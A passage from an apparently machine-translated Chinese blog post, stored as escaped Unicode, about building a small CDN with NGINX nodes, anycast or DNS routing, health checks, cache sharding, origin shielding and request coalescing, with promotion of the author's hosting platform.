\u5e74\u7684\u7b14\u8bb0\u672c\u7535\u8111\u4e0a\u6784\u5efa\u529f\u80fd\u6027 CDN\u3002\u6211\u5c06\u8ba8\u8bba\u5982\u679c\u60a8\u5728\u63a5\u4e0b\u6765\u7684\u4e94\u4e2a\u5c0f\u65f6\u5185\u6784\u5efa CDN\uff0c\u60a8\u53ef\u80fd\u4f1a\u60f3\u5230\u4ec0\u4e48\u3002\u51c6\u786e\u5b9a\u4e49 CDN \u7684\u529f\u80fd\u5f88\u6709\u7528\u3002 CDN \u5c06\u6765\u81ea\u4e2d\u592e\u5b58\u50a8\u5e93\uff08\u79f0\u4e3a\u6e90\uff09\u7684\u6587\u4ef6\u7f13\u5b58\u8d77\u6765\uff0c\u5e76\u5c06\u526f\u672c\u5b58\u50a8\u5728\u9760\u8fd1\u7528\u6237\u7684\u4f4d\u7f6e\u3002\u5728\u9ed1\u6697\u65f6\u4ee3\uff0c\u8d77\u6e90\u662f CDN \u7684 FTP \u670d\u52a1\u5668\u3002\u5982\u4eca\uff0c\u8d77\u6e90\u53ea\u662f\u7f51\u7edc\u5e94\u7528\u7a0b\u5e8f\uff0cCDN \u5145\u5f53\u4ee3\u7406\u670d\u52a1\u5668\u3002\u8fd9\u5c31\u662f\u6211\u4eec\u6b63\u5728\u6784\u5efa\u7684\uff1a\u5206\u5e03\u5f0f\u7f13\u5b58\u4ee3\u7406\u3002 HTTP \u5b9a\u4e49\u4e86\u4e00\u4e2a\u590d\u6742\u800c\u7e41\u7410\u7684\u7f13\u5b58\u7279\u6027\u7684\u6574\u4e2a\u57fa\u7840\u8bbe\u65bd\u3002\u8fd9\u4e00\u5207\u90fd\u975e\u5e38\u4ee4\u4eba\u751f\u754f\u548c\u590d\u6742\u3002\u56e0\u6b64\uff0c\u6211\u4eec\u5c06\u62b5\u5236\u4ece\u5934\u5f00\u59cb\u6784\u5efa\u5e76\u4f7f\u7528\u5176\u4ed6\u4eba\u4e3a\u6211\u4eec\u6240\u505a\u7684\u5de5\u4f5c\u7684\u51b2\u52a8\u3002\u6211\u4eec\u6709\u9009\u62e9\u3002\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528 Varnish\uff08\u811a\u672c\u7f16\u5199\uff01\u8fb9\u7f18\u5305\u62ec\uff01PHK \u535a\u5ba2\u6587\u7ae0\uff01\uff09\u3002\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528 Apache Traffic Server\uff08\u8fd9\u662f\u4eca\u5e74\u552f\u4e00\u4f7f\u7528 ATS \u7684\u65b0\u56e2\u961f\uff01\uff09\u3002\u6216\u8005\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528 NGINX\uff08\u6211\u4eec\u5df2\u7ecf\u5728\u8fd0\u884c\u5b83\uff01\uff09\u3002\u552f\u4e00\u53ef\u4ee5\u80af\u5b9a\u7684\u662f\uff0c\u4f60\u4f1a\u8ba8\u538c\u4f60\u9009\u62e9\u7684\u4efb\u4f55\u4e00\u4e2a\u3002\u5168\u90e8\u5c1d\u8bd5\u5e76\u9009\u62e9\u60a8\u6700\u4e0d\u8ba8\u538c\u7684\u4e00\u4e2a\u3002\u6211\u4eec\u8c08\u8bba\u7684\u5efa\u7b51\u4e0d\u662f\u57fa\u672c\u7684\u3002\u4f46\u4e5f\u6ca1\u6709\u90a3\u4e48\u7cdf\u7cd5\u3002\u6211\u4eec\u6240\u8981\u505a\u7684\u5c31\u662f\u91c7\u7528\u6211\u4eec\u53e4\u8001\u7684 Rails \u8bbe\u7f6e\u5e76\u5728\u591a\u4e2a\u57ce\u5e02\u8fd0\u884c\u5b83\u3002\u5982\u679c\u6211\u4eec\u80fd\u5f04\u6e05\u695a\u5982\u4f55\u8ba9\u6fb3\u5927\u5229\u4e9a\u7684\u4eba\u4eec\u8bbf\u95ee\u6211\u4eec\u5728\u6089\u5c3c\u7684\u670d\u52a1\u5668\uff0c\u4ee5\u53ca\u5982\u4f55\u8ba9\u667a\u5229\u7684\u4eba\u4eec\u8bbf\u95ee\u6211\u4eec\u5728\u5723\u5730\u4e9a\u54e5\u7684\u670d\u52a1\u5668\uff0c\u6211\u4eec\u5c31\u4f1a\u6709\u4e00\u4e9b\u6211\u4eec\u53ef\u4ee5\u5408\u7406\u5730\u79f0\u4e4b\u4e3a CDN \u7684\u4e1c\u897f\u3002\u4efb\u64ad\uff1a\u83b7\u53d6\u53ef\u8def\u7531\u7684\u5730\u5740\u5757\uff0c\u7528 BGP4 \u5728\u591a\u4e2a\u5730\u65b9\u53d1\u5e03\u5b83\u4eec\uff0c\u7136\u540e\u5728 Twitter \u4e0a\u5047\u88c5\u60a8\u5bf9\u201c\u793e\u533a\u201d\u548c\u201c\u8def\u7531\u53cd\u5c04\u5668\u201d\u6709\u610f\u89c1\u3002\u8ba9\u4e92\u8054\u7f51\u4e3a\u4f60\u505a\u8def\u7531\u3002\u7f3a\u70b9\uff1a\u66f4\u96be\u505a\uff0c\u800c\u4e14\u4e92\u8054\u7f51\u6709\u65f6\u662f\u5783\u573e\u3002\u597d\u5904\uff1a\u4f60\u53ef\u80fd\u4f1a\u53d8\u5f97\u96be\u4ee5\u5fcd\u53d7\u3002 DNS\uff1a\u8fd0\u884c\u7279\u6280 DNS \u670d\u52a1\u5668\uff0c\u6839\u636e IP \u5730\u7406\u4f4d\u7f6e\u8fd4\u56de\u7279\u5b9a\u670d\u52a1\u5668\u5730\u5740\u3002\u7f3a\u70b9\uff1a\u4e92\u8054\u7f51\u6b63\u5728\u8fdc\u79bb\u53ef\u5730\u7406\u5b9a\u4f4d\u7684 DNS \u6e90\u5730\u5740\u3002\u597d\u5904\uff1a\u60a8\u53ef\u4ee5\u5728\u6ca1\u6709\u5e2e\u52a9\u7684\u60c5\u51b5\u4e0b\u5c06\u5176\u90e8\u7f72\u5230\u4efb\u4f55\u5730\u65b9\u3002\n\u50cf\u6e38\u620f\u670d\u52a1\u5668\u4e00\u6837\uff1aPing\u4e00\u5806\u670d\u52a1\u5668\u5e76\u4f7f\u7528\u6700\u597d\u7684\u3002\u7f3a\u70b9\uff1a\u5fc5\u987b\u62e5\u6709\u5ba2\u6237\u3002\u597d\u5904\uff1a\u6ca1\u5173\u7cfb\uff0c\u56e0\u4e3a\u60a8\u4e0d\u62e5\u6709\u5ba2\u6237\u3002\u60a8\u53ef\u80fd\u4f1a\u4f7f\u7528\u4e00\u70b9\uff081\uff09\u548c\u4e00\u70b9\uff082\uff09\u3002 DNS \u8d1f\u8f7d\u5e73\u8861\u975e\u5e38\u7b80\u5355\u3002\u60a8\u751a\u81f3\u4e0d\u5fc5\u81ea\u5df1\u6784\u5efa\u5b83\uff1b\u60a8\u53ef\u4ee5\u5728 DNSimple \u7b49\u516c\u53f8\u4e0a\u6258\u7ba1 DNS\uff0c\u7136\u540e\u5b9a\u4e49\u8fd4\u56de\u5730\u5740\u7684\u89c4\u5219\u3002\u5c31\u884c\u4e86\uff01\u4efb\u64ad\u66f4\u96be\u3002\u5173\u4e8e\u8fd9\u4e00\u70b9\uff0c\u6211\u4eec\u8fd8\u6709\u66f4\u591a\u8bdd\u8981\u8bf4\u2014\u2014\u4f46\u4e0d\u662f\u5728\u8fd9\u91cc\u3002\u540c\u65f6\uff0c\u60a8\u53ef\u4ee5\u4f7f\u7528\u6211\u4eec\uff0c\u5e76\u5728\u5927\u7ea6 2 \u5206\u949f\u5185\u90e8\u7f72\u4e00\u4e2a\u5e26\u6709 Anycast \u5730\u5740\u7684\u5e94\u7528\u7a0b\u5e8f\u3002\u8fd9\u662f\u504f\u89c1\u3002\u4f46\u4e5f\uff1a\u771f\u5b9e\u3002\u7e41\u8363\uff0cCDN\u3002\u5728\u4e00\u5806\u57ce\u5e02\u4e2d\u7684\u6bcf\u4e00\u4e2a\u4e2d\u653e\u7f6e\u4e00\u4e2a NGINX\uff0c\u8fd0\u884c DNS \u6216 Anycast \u6765\u786e\u5b9a\u6d41\u91cf\u65b9\u5411\uff0c\u4f60\u5c31\u5b8c\u6210\u4e86 90%\u3002\u5269\u4e0b\u7684 10% \u9700\u8981\u51e0\u4e2a\u6708\u7684\u65f6\u95f4\u3002\u6d77\u6c34\u6df1\u5904\u5e03\u6ee1\u6d77\u5e95\u7535\u7f06\uff0c\u4e0d\u65ad\u5411\u9644\u8fd1\u7684\u8239\u53ea\u558a\u53eb\uff1a\u201c\u9a76\u8fc7\u6211\u201d\uff01\u571f\u5730\u4e5f\u597d\u4e0d\u5230\u54ea\u91cc\u53bb\uff0c\u6b63\u5982\u65e7\u7684\u7f51\u7edc\u4eba\u68da\u5c4b\u6240\u8bf4\uff1a\u201c\u53cd\u94f2\uff0c\u53cd\u94f2\uff0c\u6df1\u6316\u2014\u2014\u8ba9\u9aa8\u5e72\u8fdb\u5165\u7761\u7720\u72b6\u6001\u201d\u3002\u5f53\u60a8\u5728\u5355\u4e2a\u4f4d\u7f6e\u8fd0\u884c\u670d\u52a1\u5668\u65f6\uff0c\u60a8\u4e0d\u4f1a\u6ce8\u610f\u5230\u8fd9\u4e00\u70b9\u3002\u8fd0\u884c\u4e24\u53f0\u670d\u52a1\u5668\uff0c\u4f60\u4f1a\u5f00\u59cb\u6ce8\u610f\u5230\u3002\u5728\u4e16\u754c\u5404\u5730\u8fd0\u884c\u670d\u52a1\u5668\uff0c\u4f60\u4f1a\u6ce8\u610f\u5230\u5b83\u3002\u5f88\u9177\u7684\u662f\uff1a\u5728\u591a\u4e2a\u57ce\u5e02\u8fd0\u884c\u5355\u4e2a NGINX \u53ef\u4e3a\u60a8\u63d0\u4f9b\u5927\u91cf\u73b0\u6210\u7684\u5197\u4f59\u3002\u5982\u679c\u5176\u4e2d\u4e00\u4e2a\u56e0\u67d0\u79cd\u539f\u56e0\u6b7b\u4ea1\uff0c\u8fd8\u6709\u66f4\u591a\u7684\u6d41\u91cf\u8981\u53d1\u9001\u5230\u3002\u5f53\u60a8\u7684\u4e00\u53f0\u670d\u52a1\u5668\u8131\u673a\u65f6\uff0c\u5176\u4f59\u670d\u52a1\u5668\u4ecd\u5728\u90a3\u91cc\u4e3a\u60a8\u7684\u5927\u591a\u6570\u7528\u6237\u63d0\u4f9b\u670d\u52a1\u3002\u5b8c\u6210\u8fd9\u9879\u5de5\u4f5c\u5f88\u4e4f\u5473\u4f46\u5f88\u7b80\u5355\u3002\u60a8\u6709\u5065\u5eb7\u68c0\u67e5\uff08\u53e6\u5916\uff1a\u5f53 CDN \u533a\u57df\u4e2d\u65ad\u65f6\uff0c\u5b83\u4eec\u901a\u5e38\u4f1a\u56e0\u7f13\u6162\u800c\u4e2d\u65ad\uff0c\u56e0\u6b64\u60a8\u5e0c\u671b\u60a8\u7684\u5065\u5eb7\u68c0\u67e5\u4e5f\u80fd\u68c0\u6d4b\u5230\uff09\u3002\u5f53\u60a8\u7684 NGINX \u670d\u52a1\u5668\u51fa\u73b0\u6545\u969c\u65f6\uff0c\u5b83\u4eec\u4f1a\u544a\u8bc9\u60a8\u3002\u60a8\u7f16\u5199 DNS \u66f4\u6539\u811a\u672c\u6216\u64a4\u56de BGP \u8def\u7531\uff08\u53ef\u80fd\u53ea\u662f\u901a\u8fc7\u505c\u6b62\u8fd9\u4e9b\u533a\u57df\u4e0a\u7684 BGP4 \u670d\u52a1\uff09\u4f5c\u4e3a\u54cd\u5e94\u3002\n\u90a3\u662f\u670d\u52a1\u5668\u6545\u969c\uff0c\u5f88\u5bb9\u6613\u53d1\u73b0\u3002\u4e92\u8054\u7f51\u6253\u55dd\u66f4\u96be\u68c0\u6d4b\u3002\u60a8\u9700\u8981\u4ece\u591a\u4e2a\u4f4d\u7f6e\u8fd0\u884c\u5916\u90e8\u8fd0\u884c\u72b6\u51b5\u68c0\u67e5\u3002\u83b7\u5f97\u57fa\u672c\u7684\u3001\u591a\u89c6\u89d2\u7684\u76d1\u63a7\u5f88\u5bb9\u6613\u2014\u2014\u6211\u4eec\u4f7f\u7528 Datadog \u548c updown.io\uff0c\u6211\u4eec\u6b63\u5728\u6784\u5efa\u6211\u4eec\u81ea\u5df1\u7684\u534a\u6210\u54c1\u670d\u52a1\u3002\u60a8\u8981\u6c42\u7684\u4e0d\u4f1a\u6bd4 cURL \u544a\u8bc9\u60a8\u7684\u66f4\u591a\u3002\u518d\u8bf4\u4e00\u904d\uff1a\u60a8\u5728 CDN \u4e2d\u975e\u5e38\u62c5\u5fc3\u7684\u662f\u533a\u57df\u53d8\u6162\uff0c\u800c\u4e0d\u662f\u5b8c\u5168\u8131\u79bb Internet\u3002\u987a\u4fbf\u8bf4\u4e00\u53e5\uff1a\u8bf7\u6ce8\u610f\uff0c\u6240\u6709\u8fd9\u4e9b\u76d1\u63a7\u9009\u9879\u90fd\u9002\u7528\u4e8e\u4ece\u5176\u4ed6\u4eba\u7684\u6570\u636e\u4e2d\u5fc3\u5230\u60a8\u7684\u6570\u636e\u4e2d\u5fc3\u3002 DC-DC \u4ea4\u901a\u662f\u4e00\u4e2a\u597d\u7684\u5f00\u59cb\uff0c\u8db3\u4ee5\u5e94\u4ed8\u5f88\u591a\u5de5\u4f5c\u3002\u4f46\u4e0d\u5177\u4ee3\u8868\u6027\u3002\u60a8\u7684\u7528\u6237\u4e0d\u5728\u6570\u636e\u4e2d\u5fc3\uff08\u6211\u5e0c\u671b\uff09\u3002\u5f53\u4f60\u771f\u7684\u5f88\u53d7\u6b22\u8fce\u65f6\uff0c\u4f60\u60f3\u8981\u7684\u662f\u4ece\u5b9e\u9645\u5ba2\u6237\u7684\u6709\u5229\u4f4d\u7f6e\u8fdb\u884c\u76d1\u63a7\u3002\u4e3a\u6b64\uff0c\u60a8\u53ef\u4ee5\u627e\u5230\u6570\u767e\u5bb6\u9500\u552e RUM\uff08\u771f\u5b9e\u7528\u6237\u76d1\u63a7\uff09\u7684\u516c\u53f8\uff0c\u8fd9\u901a\u5e38\u91c7\u7528\u79d8\u5bc6\u5d4c\u5165 Javascript \u9519\u8bef\u7684\u5f62\u5f0f\u3002\u6211\u4eec\u559c\u6b22\u4e00\u79cd\u6717\u59c6\u9152\u3002\u5b83\u7531\u4e00\u5bb6\u540d\u4e3a Plantation \u7684\u516c\u53f8\u51fa\u552e\uff0c\u5e76\u5728\u9152\u6876\u4e2d\u9648\u917f\u3002\u559d\u4e00\u5927\u53e3\uff0c\u7136\u540e\u7528 Honeycomb \u505a\u4f60\u81ea\u5df1\u7684\u4eea\u5668\u3002\u53ef\u7b11\u7684\u4e92\u8054\u7f51\u95ee\u9898\u662f\u6700\u7cdf\u7cd5\u7684\u3002\u4f46\u597d\u6d88\u606f\u662f\uff0c\u6bcf\u4e2a\u4eba\u90fd\u5728\u5236\u5b9a\u89e3\u51b3\u65b9\u6848\uff0c\u56e0\u6b64\u6211\u4eec\u4e0d\u5fc5\u8fc7\u591a\u8c08\u8bba\u5b83\u4eec\u3002\u7f13\u5b58\u66f4\u6709\u8da3\u3002\u90a3\u4e48\u8ba9\u6211\u4eec\u6765\u8c08\u8c08\u6d0b\u8471\u3002\u7f13\u5b58\u6d4b\u91cf\u4e2d\u7684\u4f18\u503c\u662f\u201c\u7f13\u5b58\u6bd4\u7387\u201d\u3002\u7f13\u5b58\u6bd4\u7387\u8861\u91cf\u6211\u4eec\u80fd\u591f\u4ece\u7f13\u5b58\u4e2d\u63d0\u4f9b\u670d\u52a1\u7684\u9891\u7387\uff0c\u800c\u4e0d\u662f\u6e90\u3002 80% \u7684\u7f13\u5b58\u7387\u53ea\u662f\u610f\u5473\u7740\u201c\u5f53\u6211\u4eec\u6536\u5230\u4e00\u4e2a\u8bf7\u6c42\u65f6\uff0c\u6211\u4eec\u6709 80% \u7684\u65f6\u95f4\u53ef\u4ee5\u4ece\u7f13\u5b58\u4e2d\u63d0\u4f9b\u5b83\uff0c\u5269\u4e0b\u7684 20% \u7684\u65f6\u95f4\u6211\u4eec\u5fc5\u987b\u5c06\u8bf7\u6c42\u4ee3\u7406\u5230\u6e90\u201d\u3002\u5982\u679c\u4f60\u6b63\u5728\u6784\u5efa\u9700\u8981 CDN \u7684\u4e1c\u897f\uff0c\u9ad8\u7f13\u5b58\u7387\u662f\u597d\u7684\uff0c\u4f4e\u7f13\u5b58\u7387\u662f\u574f\u7684\u3002\u5982\u679c\u60a8\u6309\u7167\u6587\u7ae0\u524d\u9762\u7684\u94fe\u63a5\u8bbf\u95ee Github \u5b58\u50a8\u5e93\uff0c\u60a8\u53ef\u80fd\u5df2\u7ecf\u6ce8\u610f\u5230\u6211\u4eec\u7684 NGINX \u8bbe\u7f6e\u662f\u4e00\u4e2a\u72ec\u7acb\u7684\u5355\u4e2a\u670d\u52a1\u5668\u3002\u5728\u4e8c\u5341\u4e2a\u5730\u65b9\u90e8\u7f72\u5b83\u7ed9\u6211\u4eec\u4e8c\u5341\u4e2a\u5355\u72ec\u7684\u670d\u52a1\u5668\u3002\u592a\u7b80\u5355\u4e86\u3002\u4f46\u7b80\u5355\u662f\u6709\u4ee3\u4ef7\u7684\u2014\u2014\u6ca1\u6709\u6bcf\u4e2a\u533a\u57df\u7684\u5197\u4f59\u3002\u6240\u6709\u4e8c\u5341\u53f0\u670d\u52a1\u5668\u90fd\u9700\u8981\u5411\u6e90\u53d1\u51fa\u8bf7\u6c42\u3002\u8fd9\u5f88\u8106\u5f31\uff0c\u7f13\u5b58\u6bd4\u7387\u4f1a\u53d7\u5230\u5f71\u54cd\u3002\u6211\u4eec\u53ef\u4ee5\u505a\u5f97\u66f4\u597d\u3002\u589e\u52a0\u5197\u4f59\u7684\u7b80\u5355\u65b9\u6cd5\u662f\u5728\u6bcf\u4e2a\u533a\u57df\u6dfb\u52a0\u7b2c\u4e8c\u53f0\u670d\u52a1\u5668\u3002\u4f46\u662f\u8fd9\u6837\u505a\u53ef\u80fd\u4f1a\u7834\u574f\u7f13\u5b58\u6bd4\u7387\u3002\u5355\u4e2a\u670d\u52a1\u5668\u7684\u4f18\u70b9\u662f\u4e3a\u6240\u6709\u7528\u6237\u6258\u7ba1\u4e00\u4e2a\u7f13\u5b58\uff1b\u6709\u4e24\u4e2a\uff0c\u6bcf\u4e2a\u6e90\u7684\u8bf7\u6c42\u6570\u662f\u4e24\u500d\uff0c\u7f13\u5b58\u672a\u547d\u4e2d\u6570\u662f\u4e24\u500d\u3002\n\u4f60\u60f3\u8981\u505a\u7684\u662f\u6559\u4f60\u7684\u670d\u52a1\u5668\u4e92\u76f8\u4ea4\u8c08\uff0c\u8ba9\u4ed6\u4eec\u5411\u4ed6\u4eec\u7684\u670b\u53cb\u8be2\u95ee\u7f13\u5b58\u5185\u5bb9\u3002\u6700\u7b80\u5355\u7684\u65b9\u6cd5\u662f\u521b\u5efa\u7f13\u5b58\u5206\u7247 - \u5c06\u6570\u636e\u62c6\u5206\uff0c\u4ee5\u4fbf\u6bcf\u4e2a\u670d\u52a1\u5668\u8d1f\u8d23\u5176\u4e2d\u7684\u4e00\u4e2a\u5757\uff0c\u5176\u4ed6\u6240\u6709\u4eba\u5c06\u8bf7\u6c42\u8def\u7531\u5230\u62e5\u6709\u6b63\u786e\u5757\u7684\u7f13\u5b58\u5206\u7247\u3002\u8fd9\u542c\u8d77\u6765\u5f88\u590d\u6742\uff0c\u4f46 NGINX \u7684\u5185\u7f6e\u8d1f\u8f7d\u5747\u8861\u5668\u652f\u6301\u57fa\u4e8e\u54c8\u5e0c\u7684\u8d1f\u8f7d\u5747\u8861\u3002\u5b83\u6563\u5217\u8bf7\u6c42\uff0c\u5e76\u5c06\u201c\u76f8\u540c\u7684\u8bf7\u6c42\u201d\u8f6c\u53d1\u5230\u76f8\u540c\u7684\u670d\u52a1\u5668\uff0c\u5047\u8bbe\u8be5\u670d\u52a1\u5668\u53ef\u7528\u3002\u5982\u679c\u60a8\u6b63\u5728\u73a9\u8fd9\u7bc7\u535a\u6587\u7684\u5bb6\u5ead\u7248\uff0c\u8fd9\u91cc\u6709\u4e00\u4e2a\u73b0\u6210\u7684 NGINX \u96c6\u7fa4\u793a\u4f8b\uff0c\u5b83\u53ef\u4ee5\u53d1\u73b0\u5176\u5bf9\u7b49\u70b9\u3001\u6563\u5217 URL \u5e76\u901a\u8fc7\u53ef\u7528\u670d\u52a1\u5668\u5904\u7406\u8bf7\u6c42\u3002\u5f53\u5bf9 a.jpg \u7684\u8bf7\u6c42\u547d\u4e2d\u6211\u4eec\u7684 NGINX \u5b9e\u4f8b\u65f6\uff0c\u5b83\u4eec\u90fd\u4f1a\u5c06\u8bf7\u6c42\u8f6c\u53d1\u5230\u96c6\u7fa4\u4e2d\u7684\u540c\u4e00\u53f0\u670d\u52a1\u5668\u3002 b.jpg \u4e5f\u4e00\u6837\u3002\u6b64\u8bbe\u7f6e\u5c06\u670d\u52a1\u5668\u7528\u4f5c\u8d1f\u8f7d\u5e73\u8861\u4ee3\u7406\u548c\u5b58\u50a8\u5206\u7247\u3002\u60a8\u53ef\u4ee5\u5206\u79bb\u8fd9\u4e9b\u5c42\uff0c\u5982\u679c\u60a8\u8981\u5728 CDN \u4e2d\u6784\u5efa\u66f4\u9ad8\u7ea7\u7684\u529f\u80fd\uff0c\u60a8\u53ef\u80fd\u5e0c\u671b\u8fd9\u6837\u505a\u3002\u6211\u4eec\u7684\u96c6\u7fa4 NGINX \u793a\u4f8b\u4f7f\u7528\u4e86\u6211\u4eec\u8ba4\u4e3a\u975e\u5e38\u9177\u7684 Fly \u529f\u80fd\u3002\u6301\u4e45\u5377\u6709\u52a9\u4e8e\u5728 NGINX \u5347\u7ea7\u4e4b\u95f4\u4fdd\u6301\u9ad8\u7f13\u5b58\u7387\u3002\u52a0\u5bc6\u7684\u79c1\u6709\u7f51\u7edc\u4f7f\u5b89\u5168\u7684 NGINX \u5230 NGINX \u901a\u4fe1\u53d8\u5f97\u7b80\u5355\uff0c\u5e76\u4f7f\u60a8\u4e0d\u5fc5\u8fdb\u884c\u590d\u6742\u7684 mTLS \u64cd\u7ec3\u3002\u5185\u7f6e\u7684 DNS \u670d\u52a1\u53d1\u73b0\u6709\u52a9\u4e8e\u5728\u6211\u4eec\u6dfb\u52a0\u548c\u5220\u9664\u670d\u52a1\u5668\u65f6\u4f7f\u96c6\u7fa4\u4fdd\u6301\u6700\u65b0\u72b6\u6001\u3002\u5982\u679c\u8fd9\u542c\u8d77\u6765\u6709\u70b9\u8fc7\u4e8e\u5b8c\u7f8e\u5339\u914d\uff0c\u90a3\u662f\u56e0\u4e3a\u6211\u4eec\u4e13\u95e8\u4e3a\u7c7b\u4f3c CDN \u7684\u5de5\u4f5c\u8d1f\u8f7d\u6784\u5efa\u4e86\u8fd9\u4e9b\u529f\u80fd\u3002\u4f46\u662f\uff0c\u5f53\u7136\uff0c\u60a8\u53ef\u4ee5\u5728\u4efb\u4f55\u5730\u65b9\u8fdb\u884c\u6240\u6709\u8fd9\u4e9b\u64cd\u4f5c\uff0c\u800c\u4e0d\u4ec5\u4ec5\u662f\u5728 Fly \u4e0a\u3002\u4f46\u5728 Fly \u4e0a\u5f88\u5bb9\u6613\u3002\u4e24\u4e2a\u771f\u7406\uff1a\u9ad8\u7f13\u5b58\u7387\u662f\u597d\u7684\uff0c\u4e92\u8054\u7f51\u662f\u574f\u7684\u3002\u5982\u679c\u60a8\u559c\u6b22\u6740\u9e1f\u548c\u4fdd\u62a4\u77f3\u5934\uff0c\u60a8\u4f1a\u975e\u5e38\u559c\u6b22\u89e3\u51b3\u7f13\u5b58\u6bd4\u7387\u548c\u5783\u573e\u4e92\u8054\u7f51\u95ee\u9898\u3002\u8fd9\u4e24\u4e2a\u95ee\u9898\u7684\u7b54\u6848\u90fd\u6d89\u53ca\u8ba9\u4e92\u8054\u7f51\u7684\u810f\u624b\u6446\u8131\u6211\u4eec\u7684 HTTP \u8bf7\u6c42\u3002\u4e00\u79cd\u63d0\u9ad8\u7f13\u5b58\u7387\u7684\u7b80\u5355\u65b9\u6cd5\uff1a\u901a\u8fc7\u60a8\u4fe1\u4efb\u7684\u7f51\u7edc\u7ed5\u8fc7\u5931\u63a7\u7684 Internet \u548c\u4ee3\u7406\u6e90\u8bf7\u6c42\u3002 CDN \u901a\u5e38\u5728\u9760\u8fd1\u5176\u5ba2\u6237\u6765\u6e90\u7684\u533a\u57df\u8bbe\u6709\u670d\u52a1\u5668\u3002\u5982\u679c\u60a8\u5c06\u6211\u4eec\u7684 NGINX \u793a\u4f8b\u653e\u5728\u5f17\u5409\u5c3c\u4e9a\u5dde\uff0c\u60a8\u4f1a\u7a81\u7136\u62e5\u6709\u9760\u8fd1 AWS \u6700\u5927\u533a\u57df\u7684\u670d\u52a1\u5668\u3002\u800c\u4e14\u60a8\u80af\u5b9a\u5728 AWS \u4e0a\u6709\u5ba2\u6237\u3002\u8fd9\u5c31\u662f\u4e0e\u4e00\u4e2a\u5de8\u5927\u7684\u5f3a\u5927\u5784\u65ad\u8005\u5e76\u5b58\u7684\u4f18\u52bf\uff01\n\u60a8\u53ef\u4ee5\u4f7f\u7528\u4e00\u70b9 NGINX \u548c\u4ee3\u7406\u9b54\u6cd5\uff0c\u5c06\u6240\u6709\u8bf7\u6c42\u901a\u8fc7\u5f17\u5409\u5c3c\u4e9a\u5dde\u53d1\u9001\u5230\u539f\u59cb\u670d\u52a1\u5668\u3002\u8fd9\u5f88\u597d\u3002\u5f17\u5409\u5c3c\u4e9a\u5dde\u7684\u670d\u52a1\u5668\u548c us-east-1 \u4e2d\u5ba2\u6237\u7684\u670d\u52a1\u5668\u4e4b\u95f4\u7684 Internet \u718a\u9677\u9631\u8f83\u5c11\u3002\u73b0\u5728\u60a8\u62e5\u6709\u4e00\u7ec4\u89c4\u8303\u7684\u670d\u52a1\u5668\u6765\u5904\u7406\u7279\u5b9a\u5ba2\u6237\u7684\u8bf7\u6c42\u3002\u597d\u6d88\u606f\u3002\u6b64\u8bbe\u7f6e\u53ef\u63d0\u9ad8\u60a8\u7684\u7f13\u5b58\u7387\u5e76\u907f\u514d\u4e0d\u826f\u4e92\u8054\u7f51\u3002\u5bf9\u4e8e\u5956\u52b1\u79ef\u5206\uff0c\u5b83\u4e5f\u662f\u989d\u5916 CDN \u529f\u80fd\u7684\u57fa\u7840\u3002\u5982\u679c\u60a8\u66fe\u7ecf\u5728 CDN \u4e0a\u8d2d\u7269\uff0c\u5c31\u4f1a\u9047\u5230\u8bf8\u5982\u201c\u5c4f\u853d\u201d\u548c\u201c\u8bf7\u6c42\u5408\u5e76\u201d\u4e4b\u7c7b\u7684\u4e1c\u897f\u3002\u6e90\u5934\u5c4f\u853d\u901a\u5e38\u4ec5\u610f\u5473\u7740\u901a\u8fc7\u5df2\u77e5\u6570\u636e\u4e2d\u5fc3\u53d1\u9001\u6240\u6709\u6d41\u91cf\u3002\u8fd9\u53ef\u4ee5\u6700\u5927\u9650\u5ea6\u5730\u51cf\u5c11\u5230\u6e90\u670d\u52a1\u5668\u7684\u6d41\u91cf\uff0c\u800c\u4e14\uff0c\u56e0\u4e3a\u60a8\u53ef\u80fd\u77e5\u9053\u60a8\u7684 CDN \u533a\u57df\u4f7f\u7528\u7684 IP\uff0c\u60a8\u53ef\u4ee5\u4f7f\u7528\u7b80\u5355\u7684 L4 \u9632\u706b\u5899\u89c4\u5219\u6765\u63a7\u5236\u8bbf\u95ee\u3002\u5408\u5e76\u8bf7\u6c42\u8fd8\u53ef\u4ee5\u6700\u5927\u9650\u5ea6\u5730\u51cf\u5c11\u539f\u59cb\u6d41\u91cf\uff0c\u5c24\u5176\u662f\u5728\u8bb8\u591a\u7528\u6237\u8bd5\u56fe\u83b7\u53d6\u76f8\u540c\u5185\u5bb9\u7684\u5927\u578b\u6d3b\u52a8\u671f\u95f4\u3002\u5f53 100,000 \u540d\u7528\u6237\u540c\u65f6\u8bf7\u6c42\u60a8\u6700\u65b0\u7684\u5de7\u5999\u7f16\u5199\u7684\u535a\u5ba2\u6587\u7ae0\uff0c\u5e76\u4e14\u5c1a\u672a\u7f13\u5b58\u65f6\uff0c\u8fd9\u53ef\u80fd\u610f\u5473\u7740 100,000 \u4e2a\u5e76\u53d1\u8bf7\u6c42\u5230\u60a8\u7684\u6e90\u3002\u5bf9\u4e8e\u5927\u591a\u6570\u6765\u6e90\u6765\u8bf4\uff0c\u8fd9\u662f\u4e00\u4e2a\u9762\u90e8\u878d\u5316\u7684\u6d41\u91cf\u6c34\u5e73\u3002\u89e3\u51b3\u8fd9\u4e2a\u95ee\u9898\u662f\u201c\u9501\u5b9a\u201d\u4e00\u4e2a\u7279\u5b9a\u7684 URL\uff0c\u4ee5\u786e\u4fdd\u5982\u679c NGINX \u670d\u52a1\u5668\u53d1\u51fa\u539f\u59cb\u8bf7\u6c42\uff0c\u5176\u4ed6\u5ba2\u6237\u7aef\u4f1a\u6682\u505c\uff0c\u76f4\u5230\u7f13\u5b58\u662f\u6587\u4ef6\u3002\u5728\u6211\u4eec\u7684\u96c6\u7fa4 NGINX \u793a\u4f8b\u4e2d\uff0c\u8fd9\u662f\u4e00\u4e2a\u4e24\u884c\u914d\u7f6e\u3002\u901a\u8fc7\u5355\u4e2a\u533a\u57df\u8fdb\u884c\u4ee3\u7406\u4ee5\u63d0\u9ad8\u7f13\u5b58\u7387\u6709\u70b9\u50cf\u4f5c\u5f0a\u3002 CDN \u7684\u5168\u90e8\u76ee\u7684\u662f\u4e3a\u7528\u6237\u52a0\u5feb\u901f\u5ea6\u3002\u4ece\u65b0\u52a0\u5761\u5411\u5f17\u5409\u5c3c\u4e9a\u53d1\u9001\u8bf7\u6c42\u53ea\u4f1a\u8ba9\u4e8b\u60c5\u53d8\u5f97\u66f4\u5feb\uff0c\u56e0\u4e3a\u4e00\u7ec4\u5e26\u6709\u7f13\u5b58\u5185\u5bb9\u7684 NGINX 